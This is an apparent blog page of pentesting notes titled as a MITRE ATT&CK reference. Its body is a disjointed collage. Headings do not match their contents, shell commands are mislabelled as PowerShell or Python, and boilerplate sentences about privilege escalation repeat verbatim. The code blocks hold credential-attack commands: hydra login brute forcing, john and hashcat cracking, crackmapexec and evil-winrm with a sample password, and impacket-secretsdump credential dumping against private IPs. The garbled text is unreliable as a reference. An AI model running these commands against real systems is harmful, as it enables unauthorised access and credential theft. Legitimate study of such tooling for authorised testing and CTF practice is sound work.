---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "networking, lateral movement, dfir"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-584.html"
URL_IMAGES: ""
Date: "2025-06-08"
Tags: "Networking, Lateral Movement, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-584"
Permalink: "/notes/note-mitre-att&ck-framework-reference-584.html"
BtnLabel: "Read Notes"
Pick: 0
---
## FTP

### crackmapexec

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.116.15.77 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.52.193.18 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
evil-winrm -i 10.42.215.206 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p1521,993,389 10.72.70.146 -oN scan.txt
evil-winrm -i 10.93.206.208 -u administrator -p 'P@ssw0rd!'
```

## Weak Service Permissions

### SQL Injection

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

## Flask

### IMAP

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.191.152/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.9.210/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.218.150 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## SMTP

### ligolo-ng

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.173.112 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## ffuf

### lookupsid

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.203.128
crackmapexec smb 10.53.100.172 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.95.212
```

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

- `msfvenom`
- `NTLM Relay`
- `wpscan`
- `Unquoted Service Path`
- `rpcclient`

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.
